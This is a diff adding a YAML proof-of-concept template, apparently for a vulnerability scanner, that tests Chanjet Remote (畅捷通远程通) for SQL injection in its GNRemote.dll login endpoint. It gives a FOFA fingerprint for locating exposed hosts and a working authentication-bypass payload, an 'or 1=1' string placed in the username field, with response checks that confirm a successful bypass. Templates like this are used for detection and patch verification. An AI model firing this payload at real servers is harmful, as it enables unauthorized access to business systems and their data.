@@ -1,0 +1,31 @@
+id: poc-yaml-chanjet-gnremote-login-sqli
+info:
+  name: 畅捷通远程通 GNRemote.dll SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 远程通CHANJET_Remote
+  fofa: body="远程通CHANJET_Remote"
+requests:
+- method: POST
+  path: /GNRemote.dll?GNFunction=LoginServer&decorator=text_wrap&frombrowser=esl
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: 'username=xxxxx&password=xxxxxxx&ClientStatus=1
+
+    '
+  expression: 'trim(body) == "{\"RetCode\":2}"
+
+    '
+- method: POST
+  path: /GNRemote.dll?GNFunction=LoginServer&decorator=text_wrap&frombrowser=esl
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: 'username=%22''%20or%201%3d1%3b%22&password=%018d8cbc8bfc24f018&ClientStatus=1
+
+    '
+  expression: 'trim(body) == "{\"RetCode\":0}"
+
+    '
+variables: {}
+transport: http
